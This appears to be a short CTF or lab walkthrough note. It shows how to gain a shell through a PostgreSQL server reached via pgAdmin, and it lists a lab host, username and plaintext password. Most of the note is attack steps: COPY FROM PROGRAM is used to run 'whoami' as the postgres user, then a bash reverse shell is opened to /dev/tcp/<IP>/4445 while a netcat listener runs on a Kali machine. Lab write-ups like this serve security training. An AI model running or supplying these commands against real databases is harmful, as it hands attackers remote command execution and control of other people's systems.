
Once connected to pgAdmin web:

#pgAdmin_Web
1. Add a PostgreSQL server: *Servers right-click -> Register -> Server*.

```
Host : `172.18.0.3`
Port : `5432`
Database : `ps_db`
Username : `root`
Password : PsqLR00tpaSS11
```

![[PostgresSQLServer.png]]

2. Open Query Tool  *ps_db  -> Schemas -> Public -> Tables -> Query Tool right-click* , paste the code below and execute clicking on :![[play.png]]

```
DROP TABLE IF EXISTS cmd_test;
CREATE TABLE cmd_test(output text);
COPY cmd_test FROM PROGRAM 'whoami';
SELECT * FROM cmd_test;
```

![[query1.png]]


Result: Command execution confirmed as postgres user.

![[data_output.png]]

#Attaking_machine 
3. Reverse shell: Prepare listener on Kali:

```
nc -lvnp 4445
```

#pgAdmin_Web 
4. Delete the code from the Query Tool and run the following code:

```
DROP TABLE IF EXISTS cmd;
CREATE TABLE cmd(output text);
COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP>/4445 0>&1"';
```
Result: Shell as `postgres` in the PostgreSQL container (172.18.0.3).